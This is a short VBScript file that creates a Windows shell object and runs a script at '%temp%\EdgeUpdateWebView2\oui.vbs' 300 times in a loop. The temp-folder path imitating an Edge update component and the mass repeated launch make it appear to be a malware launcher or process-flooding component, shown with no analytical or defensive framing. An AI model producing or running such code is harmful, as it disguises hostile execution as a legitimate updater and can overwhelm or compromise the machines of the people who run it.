dim count
set object = wscript.CreateObject("wscript.shell")

do
object.run "%temp%\EdgeUpdateWebView2\oui.vbs"
count = count + 1
loop until count = 300